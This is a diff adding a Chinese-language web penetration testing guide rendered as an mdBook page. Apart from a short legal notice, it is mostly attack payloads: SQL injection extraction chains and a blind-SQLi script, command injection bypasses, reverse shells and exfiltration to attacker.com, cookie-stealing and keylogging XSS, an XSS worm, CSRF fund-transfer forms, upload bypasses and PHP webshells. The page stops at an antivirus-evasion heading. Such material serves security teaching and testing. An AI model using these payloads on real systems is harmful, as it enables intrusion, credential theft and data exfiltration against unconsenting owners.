@@ -1,0 +1,1632 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Web渗透测试完整学习指南 - 开发</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../theme/pagetoc.css">
+        <link rel="stylesheet" href="../../theme/help-overlay.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">开发</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="搜索本书内容..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <!-- Page table of contents -->
+                        <div class="sidetoc"><nav class="pagetoc"></nav></div>
+
+                        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css">
+<h1 id="web渗透测试完整学习指南"><a class="header" href="#web渗透测试完整学习指南">Web渗透测试完整学习指南</a></h1>
+<h2 id="-学习路线图"><a class="header" href="#-学习路线图">📋 学习路线图</a></h2>
+<pre><code>基础准备(2-4周) → 信息收集(1-2周) → 漏洞挖掘(4-6周) → 权限提升(2-3周) → 高级技术(3-4周) → 实战演练(持续)
+</code></pre>
+<h2 id="-法律声明与道德准则"><a class="header" href="#-法律声明与道德准则">⚖️ 法律声明与道德准则</a></h2>
+<blockquote>
+<p><strong>重要提醒</strong>: 未经授权的渗透测试是违法行为！</p>
+</blockquote>
+<h3 id="合法使用场景"><a class="header" href="#合法使用场景">合法使用场景</a></h3>
+<ul>
+<li>✅ 获得书面授权的渗透测试项目</li>
+<li>✅ 个人搭建的测试环境（DVWA、WebGoat等）</li>
+<li>✅ 合法的CTF竞赛和漏洞赏金计划</li>
+<li>✅ 企业内部安全审计（需授权）</li>
+</ul>
+<h3 id="禁止行为"><a class="header" href="#禁止行为">禁止行为</a></h3>
+<ul>
+<li>❌ 未授权访问他人系统</li>
+<li>❌ 破坏性测试和数据删除</li>
+<li>❌ 利用漏洞进行非法获利</li>
+<li>❌ 传播恶意代码</li>
+</ul>
+<hr />
+<h2 id="1-基础知识体系"><a class="header" href="#1-基础知识体系">1. 基础知识体系</a></h2>
+<h3 id="11-网络协议深入理解"><a class="header" href="#11-网络协议深入理解">1.1 网络协议深入理解</a></h3>
+<h4 id="httphttps协议"><a class="header" href="#httphttps协议">HTTP/HTTPS协议</a></h4>
+<p><strong>核心概念</strong>:</p>
+<ul>
+<li>HTTP请求方法: GET、POST、PUT、DELETE、HEAD、OPTIONS、PATCH</li>
+<li>响应状态码: 1xx信息、2xx成功、3xx重定向、4xx客户端错误、5xx服务器错误</li>
+<li>请求头/响应头的安全意义</li>
+</ul>
+<p><strong>实战案例 - HTTP请求走私</strong>:</p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: bar
+</code></pre>
+<p><strong>关键安全点</strong>:</p>
+<ul>
+<li>Cookie的安全属性: Secure、HttpOnly、SameSite</li>
+<li>CORS跨域资源共享配置错误</li>
+<li>HTTPS中间人攻击与证书验证</li>
+</ul>
+<h4 id="tcpip协议栈"><a class="header" href="#tcpip协议栈">TCP/IP协议栈</a></h4>
+<p><strong>三次握手与四次挥手</strong>:</p>
+<pre><code>客户端                    服务器
+  |----SYN seq=x---------&gt;|
+  |&lt;---SYN-ACK seq=y------|
+  |----ACK seq=x+1-------&gt;|
+</code></pre>
+<p><strong>渗透测试中的应用</strong>:</p>
+<ul>
+<li>TCP SYN扫描（隐蔽扫描）</li>
+<li>TCP连接扫描（全连接扫描）</li>
+<li>TCP FIN/NULL/XMAS扫描（规避防火墙）</li>
+</ul>
+<h4 id="dns解析机制"><a class="header" href="#dns解析机制">DNS解析机制</a></h4>
+<p><strong>DNS记录类型</strong>:</p>
+<ul>
+<li>A记录: IPv4地址</li>
+<li>AAAA记录: IPv6地址</li>
+<li>CNAME记录: 别名记录</li>
+<li>MX记录: 邮件服务器</li>
+<li>TXT记录: 文本信息（SPF、DKIM）</li>
+</ul>
+<p><strong>DNS安全测试</strong>:</p>
+<pre><code class="language-bash"># DNS区域传送漏洞测试
+dig @ns1.target.com target.com axfr
+
+# DNS缓存投毒检测
+dig @8.8.8.8 target.com +trace
+
+# 子域名枚举
+subfinder -d target.com
+amass enum -d target.com
+</code></pre>
+<h4 id="websocket协议"><a class="header" href="#websocket协议">WebSocket协议</a></h4>
+<p><strong>安全风险</strong>:</p>
+<ul>
+<li>WebSocket劫持</li>
+<li>跨站WebSocket劫持（CSWSH）</li>
+<li>消息注入攻击</li>
+</ul>
+<p><strong>测试示例</strong>:</p>
+<pre><code class="language-javascript">// WebSocket连接测试
+const ws = new WebSocket('wss://target.com/socket');
+ws.onopen = () =&gt; {
+    ws.send(JSON.stringify({
+        type: 'admin',
+        command: 'getUserList'
+    }));
+};
+</code></pre>
+<h3 id="12-web技术栈安全"><a class="header" href="#12-web技术栈安全">1.2 Web技术栈安全</a></h3>
+<h4 id="前端技术安全"><a class="header" href="#前端技术安全">前端技术安全</a></h4>
+<p><strong>HTML安全</strong>:</p>
+<ul>
+<li>HTML注入与标签过滤绕过</li>
+<li>iframe沙箱逃逸</li>
+<li>元标签利用</li>
+</ul>
+<p><strong>JavaScript安全</strong>:</p>
+<pre><code class="language-javascript">// 原型链污染示例
+let obj = {};
+obj.__proto__.polluted = 'true';
+console.log({}.polluted); // 输出: true
+
+// DOM型XSS
+let search = location.search.substring(1);
+document.getElementById('output').innerHTML = search; // 危险!
+</code></pre>
+<p><strong>CSS注入</strong>:</p>
+<pre><code class="language-css">/* CSS数据窃取 */
+input[value^="a"] {
+    background: url('http://attacker.com/?char=a');
+}
+</code></pre>
+<h4 id="后端框架漏洞"><a class="header" href="#后端框架漏洞">后端框架漏洞</a></h4>
+<p><strong>PHP常见漏洞</strong>:</p>
+<pre><code class="language-php">// 文件包含漏洞
+include($_GET['page']); // 危险!
+
+// 反序列化漏洞
+$user = unserialize($_COOKIE['user']); // 危险!
+
+// 命令注入
+system("ping -c 4 " . $_GET['ip']); // 危险!
+</code></pre>
+<p><strong>Java常见漏洞</strong>:</p>
+<pre><code class="language-java">// JDBC注入
+String query = "SELECT * FROM users WHERE id=" + request.getParameter("id");
+
+// 表达式注入(SpEL)
+parser.parseExpression(userInput).getValue(); // 危险!
+</code></pre>
+<p><strong>Python/Django漏洞</strong>:</p>
+<pre><code class="language-python"># ORM注入
+User.objects.extra(where=["username='%s'" % request.GET['name']]) # 危险!
+
+# SSTI模板注入
+template = Template(user_input) # 危险!
+</code></pre>
+<h4 id="数据库安全"><a class="header" href="#数据库安全">数据库安全</a></h4>
+<p><strong>MySQL注入防护绕过</strong>:</p>
+<pre><code class="language-sql">-- 绕过空格过滤
+SELECT/**/username/**/FROM/**/users
+
+-- 绕过引号过滤
+SELECT * FROM users WHERE id=0x61646d696e
+
+-- 时间盲注
+SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
+</code></pre>
+<p><strong>NoSQL注入</strong>:</p>
+<pre><code class="language-javascript">// MongoDB注入示例
+db.users.find({
+    username: req.body.username,
+    password: req.body.password
+});
+
+// 攻击载荷
+{
+    "username": {"$ne": null},
+    "password": {"$ne": null}
+}
+</code></pre>
+<hr />
+<h2 id="2-信息收集方法论"><a class="header" href="#2-信息收集方法论">2. 信息收集方法论</a></h2>
+<h3 id="21-被动信息收集"><a class="header" href="#21-被动信息收集">2.1 被动信息收集</a></h3>
+<h4 id="搜索引擎利用google-hacking"><a class="header" href="#搜索引擎利用google-hacking">搜索引擎利用（Google Hacking）</a></h4>
+<p><strong>常用Dork语法</strong>:</p>
+<pre><code>site:target.com filetype:pdf           # 查找PDF文件
+site:target.com inurl:admin            # 查找管理后台
+site:target.com intitle:"index of"     # 查找目录列表
+site:target.com ext:sql | ext:db       # 查找数据库文件
+site:target.com intext:"password"      # 查找密码信息
+</code></pre>
+<p><strong>高级搜索技巧</strong>:</p>
+<pre><code># 查找配置文件
+site:target.com ext:env | ext:config | ext:ini
+
+# 查找API密钥
+site:target.com intext:"api_key" | intext:"apikey"
+
+# 查找敏感目录
+site:target.com inurl:"/backup/" | inurl:"/old/"
+
+# 查找错误信息
+site:target.com intext:"sql syntax" | intext:"warning: mysql"
+</code></pre>
+<h4 id="osint开源情报收集"><a class="header" href="#osint开源情报收集">OSINT开源情报收集</a></h4>
+<p><strong>域名信息查询</strong>:</p>
+<pre><code class="language-bash"># Whois查询
+whois target.com
+
+# DNS记录查询
+dig target.com ANY
+nslookup -type=any target.com
+
+# 历史DNS记录
+curl -s "https://securitytrails.com/domain/target.com/dns"
+</code></pre>
+<p><strong>社交媒体情报</strong>:</p>
+<ul>
+<li>LinkedIn员工信息收集（技术栈、部门结构）</li>
+<li>GitHub代码泄露搜索</li>
+<li>Twitter/X技术讨论分析</li>
+<li>招聘网站技术栈信息</li>
+</ul>
+<p><strong>工具推荐</strong>:</p>
+<pre><code class="language-bash"># theHarvester - 邮箱和子域名收集
+theHarvester -d target.com -b all
+
+# Shodan - 互联网设备搜索
+shodan search "hostname:target.com"
+
+# Censys - SSL证书搜索
+censys search "target.com"
+</code></pre>
+<h3 id="22-主动信息收集"><a class="header" href="#22-主动信息收集">2.2 主动信息收集</a></h3>
+<h4 id="端口扫描策略"><a class="header" href="#端口扫描策略">端口扫描策略</a></h4>
+<p><strong>Nmap扫描技术</strong>:</p>
+<pre><code class="language-bash"># TCP SYN扫描（隐蔽扫描）
+nmap -sS -p- target.com
+
+# 服务版本检测
+nmap -sV -p 80,443,8080 target.com
+
+# 操作系统识别
+nmap -O target.com
+
+# 全面扫描（NSE脚本）
+nmap -A -p- target.com
+
+# 绕过防火墙
+nmap -f -D RND:10 -p- target.com
+
+# UDP扫描
+nmap -sU -p 53,161,162 target.com
+</code></pre>
+<p><strong>Masscan高速扫描</strong>:</p>
+<pre><code class="language-bash"># 全端口快速扫描
+masscan -p1-65535 --rate=10000 target.com
+
+# 扫描Web端口
+masscan -p80,443,8000-9000 --rate=5000 10.0.0.0/8
+</code></pre>
+<h4 id="目录枚举"><a class="header" href="#目录枚举">目录枚举</a></h4>
+<p><strong>工具使用</strong>:</p>
+<pre><code class="language-bash"># Gobuster目录爆破
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50
+
+# Dirsearch
+dirsearch -u https://target.com -e php,html,js -x 403,404
+
+# Feroxbuster（递归扫描）
+feroxbuster -u https://target.com -w wordlist.txt --depth 3
+
+# ffuf（快速模糊测试）
+ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302
+</code></pre>
+<p><strong>自定义字典生成</strong>:</p>
+<pre><code class="language-bash"># CeWL - 从网站生成字典
+cewl https://target.com -d 3 -m 5 -w wordlist.txt
+
+# Crunch - 生成密码字典
+crunch 8 12 -t admin%%%% -o passwords.txt
+</code></pre>
+<h4 id="子域名枚举"><a class="header" href="#子域名枚举">子域名枚举</a></h4>
+<p><strong>被动枚举</strong>:</p>
+<pre><code class="language-bash"># Sublist3r
+sublist3r -d target.com -o subdomains.txt
+
+# Amass被动模式
+amass enum -passive -d target.com
+
+# 证书透明度日志
+curl -s "https://crt.sh/?q=%25.target.com&amp;output=json" | jq -r '.[].name_value' | sort -u
+</code></pre>
+<p><strong>主动枚举</strong>:</p>
+<pre><code class="language-bash"># Amass主动模式
+amass enum -active -d target.com -brute -w subdomains-top1mil.txt
+
+# Subfinder
+subfinder -d target.com -o subdomains.txt
+
+# DNS字典爆破
+dnsrecon -d target.com -t brt -D subdomains.txt
+</code></pre>
+<p><strong>子域名接管检测</strong>:</p>
+<pre><code class="language-bash"># SubOver
+SubOver -l subdomains.txt -o takeover.txt
+
+# Subjack
+subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
+</code></pre>
+<hr />
+<h2 id="3-漏洞挖掘核心技术"><a class="header" href="#3-漏洞挖掘核心技术">3. 漏洞挖掘核心技术</a></h2>
+<h3 id="31-注入类漏洞深入"><a class="header" href="#31-注入类漏洞深入">3.1 注入类漏洞深入</a></h3>
+<h4 id="sql注入完整攻击链"><a class="header" href="#sql注入完整攻击链">SQL注入完整攻击链</a></h4>
+<p><strong>注入点识别</strong>:</p>
+<pre><code class="language-sql">-- 单引号测试
+' OR '1'='1
+
+-- 双引号测试
+" OR "1"="1
+
+-- 数字型注入
+1 OR 1=1
+
+-- 时间盲注
+1' AND SLEEP(5)--
+
+-- 报错注入
+1' AND extractvalue(1,concat(0x7e,database()))--
+</code></pre>
+<p><strong>联合查询注入</strong>:</p>
+<pre><code class="language-sql">-- 确定列数
+' ORDER BY 1--
+' ORDER BY 2--
+...
+
+-- 确定显示位
+' UNION SELECT 1,2,3,4--
+
+-- 提取数据
+' UNION SELECT 1,database(),user(),version()--
+
+-- 提取表名
+' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--
+
+-- 提取列名
+' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
+
+-- 提取数据
+' UNION SELECT 1,username,password,email FROM users--
+</code></pre>
+<p><strong>时间盲注自动化</strong>:</p>
+<pre><code class="language-python">import requests
+import time
+
+def time_based_sqli(url, payload_template):
+    result = ""
+    for i in range(1, 50):
+        for char in range(32, 127):
+            payload = payload_template.format(position=i, char=char)
+            start = time.time()
+            requests.get(url + payload)
+            elapsed = time.time() - start
+
+            if elapsed &gt;= 5:
+                result += chr(char)
+                print(f"[+] Found char: {chr(char)}, Result: {result}")
+                break
+        else:
+            break
+    return result
+
+# 使用示例
+url = "http://target.com/page?id=1"
+payload = "' AND IF(ASCII(SUBSTRING(database(),{position},1))={char},SLEEP(5),0)--"
+database_name = time_based_sqli(url, payload)
+</code></pre>
+<p><strong>SQLMap自动化利用</strong>:</p>
+<pre><code class="language-bash"># 基础注入检测
+sqlmap -u "http://target.com/page?id=1" --batch
+
+# 指定注入技术
+sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
+
+# 获取数据库信息
+sqlmap -u "http://target.com/page?id=1" --dbs --current-db --current-user
+
+# 提取表和数据
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
+
+# POST请求注入
+sqlmap -u "http://target.com/login" --data="username=admin&amp;password=pass" -p username
+
+# Cookie注入
+sqlmap -u "http://target.com/page" --cookie="PHPSESSID=xxx" --level=2
+
+# WAF绕过
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
+</code></pre>
+<h4 id="nosql注入攻击"><a class="header" href="#nosql注入攻击">NoSQL注入攻击</a></h4>
+<p><strong>MongoDB注入</strong>:</p>
+<pre><code class="language-javascript">// 认证绕过
+db.users.find({username: {$ne: null}, password: {$ne: null}})
+
+// JavaScript注入
+db.users.find({$where: "this.username == '" + username + "'"})
+
+// 攻击载荷
+username[$ne]=null&amp;password[$ne]=null
+
+// 盲注
+{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
+</code></pre>
+<p><strong>防御绕过技巧</strong>:</p>
+<pre><code class="language-json">{
+    "username": {"$gt": ""},
+    "password": {"$gt": ""}
+}
+
+{
+    "username": {"$regex": ".*"},
+    "password": {"$exists": true}
+}
+</code></pre>
+<h4 id="命令注入"><a class="header" href="#命令注入">命令注入</a></h4>
+<p><strong>命令执行漏洞</strong>:</p>
+<pre><code class="language-bash"># 基础注入
+127.0.0.1; whoami
+127.0.0.1 &amp;&amp; cat /etc/passwd
+127.0.0.1 | ls -la
+
+# 绕过空格过滤
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+
+# 绕过关键词过滤
+c''at /etc/passwd
+c\at /etc/passwd
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+
+# 反弹Shell
+bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+nc -e /bin/bash attacker.com 4444
+</code></pre>
+<p><strong>盲命令注入检测</strong>:</p>
+<pre><code class="language-bash"># DNS外带
+nslookup `whoami`.attacker.com
+
+# HTTP外带
+curl http://attacker.com/$(whoami)
+
+# 时间延迟
+ping -c 10 127.0.0.1
+sleep 10
+</code></pre>
+<h3 id="32-跨站脚本攻击xss"><a class="header" href="#32-跨站脚本攻击xss">3.2 跨站脚本攻击（XSS）</a></h3>
+<h4 id="反射型xss"><a class="header" href="#反射型xss">反射型XSS</a></h4>
+<p><strong>基础载荷</strong>:</p>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;body onload=alert(1)&gt;
+</code></pre>
+<p><strong>绕过技巧</strong>:</p>
+<pre><code class="language-html">&lt;!-- 大小写绕过 --&gt;
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+
+&lt;!-- 编码绕过 --&gt;
+&lt;img src=x onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)"&gt;
+&lt;img src=x onerror="eval(atob('YWxlcnQoMSk='))"&gt;
+
+&lt;!-- 过滤绕过 --&gt;
+&lt;img src=x onerror=alert`1`&gt;
+&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;
+
+&lt;!-- 事件处理器 --&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;select onfocus=alert(1) autofocus&gt;
+&lt;textarea onfocus=alert(1) autofocus&gt;
+
+&lt;!-- 协议处理器 --&gt;
+&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;
+&lt;a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;Click&lt;/a&gt;
+</code></pre>
+<p><strong>Cookie窃取</strong>:</p>
+<pre><code class="language-javascript">&lt;script&gt;
+new Image().src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
+&lt;/script&gt;
+
+&lt;script&gt;
+fetch('http://attacker.com/steal', {
+    method: 'POST',
+    body: document.cookie
+});
+&lt;/script&gt;
+</code></pre>
+<h4 id="存储型xss"><a class="header" href="#存储型xss">存储型XSS</a></h4>
+<p><strong>持久化攻击</strong>:</p>
+<pre><code class="language-html">&lt;!-- 评论区XSS --&gt;
+&lt;img src=x onerror="setInterval(function(){new Image().src='http://attacker.com/keylog?k='+document.body.innerText},5000)"&gt;
+
+&lt;!-- 个人资料XSS --&gt;
+&lt;script&gt;
+if(document.cookie.indexOf('admin') !== -1){
+    window.location = 'http://attacker.com/admin?cookies=' + document.cookie;
+}
+&lt;/script&gt;
+</code></pre>
+<p><strong>蠕虫式XSS</strong>:</p>
+<pre><code class="language-javascript">&lt;script&gt;
+// 自我复制的XSS蠕虫
+var payload = '&lt;script&gt;/* XSS代码 */&lt;\/script&gt;';
+var xhr = new XMLHttpRequest();
+xhr.open('POST', '/api/comment', true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send(JSON.stringify({comment: payload}));
+&lt;/script&gt;
+</code></pre>
+<h4 id="dom型xss"><a class="header" href="#dom型xss">DOM型XSS</a></h4>
+<p><strong>DOM操作漏洞</strong>:</p>
+<pre><code class="language-javascript">// 危险的DOM操作
+document.getElementById('output').innerHTML = location.hash.substring(1);
+
+// 攻击载荷
+http://target.com/#&lt;img src=x onerror=alert(1)&gt;
+</code></pre>
+<p><strong>AngularJS模板注入</strong>:</p>
+<pre><code class="language-html">{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+</code></pre>
+<p><strong>jQuery选择器注入</strong>:</p>
+<pre><code class="language-javascript">$('#' + location.hash.substring(1)).html('content');
+// 攻击: http://target.com/#&lt;img src=x onerror=alert(1)&gt;
+</code></pre>
+<h4 id="csp绕过技术"><a class="header" href="#csp绕过技术">CSP绕过技术</a></h4>
+<p><strong>基础CSP策略</strong>:</p>
+<pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
+</code></pre>
+<p><strong>绕过方法</strong>:</p>
+<pre><code class="language-html">&lt;!-- JSONP端点滥用 --&gt;
+&lt;script src="https://trusted.cdn.com/jsonp?callback=alert"&gt;&lt;/script&gt;
+
+&lt;!-- AngularJS库利用 --&gt;
+&lt;script src="https://trusted.cdn.com/angular.js"&gt;&lt;/script&gt;
+&lt;div ng-app ng-csp&gt;{{$eval.constructor('alert(1)')()}}&lt;/div&gt;
+
+&lt;!-- Base标签注入 --&gt;
+&lt;base href="http://attacker.com/"&gt;
+&lt;script src="/evil.js"&gt;&lt;/script&gt;
+</code></pre>
+<h3 id="33-跨站请求伪造csrf"><a class="header" href="#33-跨站请求伪造csrf">3.3 跨站请求伪造（CSRF）</a></h3>
+<p><strong>CSRF攻击示例</strong>:</p>
+<pre><code class="language-html">&lt;!-- GET型CSRF --&gt;
+&lt;img src="http://bank.com/transfer?to=attacker&amp;amount=1000"&gt;
+
+&lt;!-- POST型CSRF --&gt;
+&lt;form id="csrf" action="http://bank.com/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="to" value="attacker"&gt;
+    &lt;input type="hidden" name="amount" value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+
+&lt;!-- JSON CSRF --&gt;
+&lt;script&gt;
+fetch('http://bank.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({to: 'attacker', amount: 1000})
+});
+&lt;/script&gt;
+</code></pre>
+<p><strong>Token绕过技术</strong>:</p>
+<pre><code class="language-javascript">// Token泄露
+&lt;script&gt;
+fetch('/profile')
+    .then(r =&gt; r.text())
+    .then(html =&gt; {
+        var token = html.match(/csrf_token" value="([^"]+)"/)[1];
+        fetch('/transfer', {
+            method: 'POST',
+            body: 'to=attacker&amp;amount=1000&amp;csrf_token=' + token
+        });
+    });
+&lt;/script&gt;
+</code></pre>
+<h3 id="34-文件上传漏洞"><a class="header" href="#34-文件上传漏洞">3.4 文件上传漏洞</a></h3>
+<h4 id="文件类型绕过"><a class="header" href="#文件类型绕过">文件类型绕过</a></h4>
+<p><strong>MIME类型绕过</strong>:</p>
+<pre><code class="language-http">POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg
+
+&lt;?php system($_GET['cmd']); ?&gt;
+------WebKitFormBoundary--
+</code></pre>
+<p><strong>文件扩展名绕过</strong>:</p>
+<pre><code>shell.php.jpg        # 双扩展名
+shell.php%00.jpg     # 空字节注入（旧版本）
+shell.php/.          # 特殊字符
+shell.php::$DATA     # NTFS ADS
+shell.php%20         # 空格截断
+shell.php.           # 点号截断
+</code></pre>
+<p><strong>文件头伪造</strong>:</p>
+<pre><code class="language-php">GIF89a
+&lt;?php system($_GET['cmd']); ?&gt;
+</code></pre>
+<p><strong>内容检测绕过</strong>:</p>
+<pre><code class="language-php"># 图片马制作
+copy /b normal.jpg + shell.php image.jpg
+
+# Webshell隐藏
+&lt;?php @eval($_POST['cmd']); ?&gt; // 混淆在正常图片数据中
+</code></pre>
+<h4 id="webshell利用"><a class="header" href="#webshell利用">Webshell利用</a></h4>
+<p><strong>PHP一句话木马</strong>:</p>
+<pre><code class="language-php">&lt;?php @eval($_POST['cmd']); ?&gt;
+&lt;?php system($_GET['c']); ?&gt;
+&lt;?=`$_GET[c]`?&gt;
+&lt;?=system($_REQUEST[c]);?&gt;
+</code></pre>
+<p><strong>免杀技巧</strong>:</p>
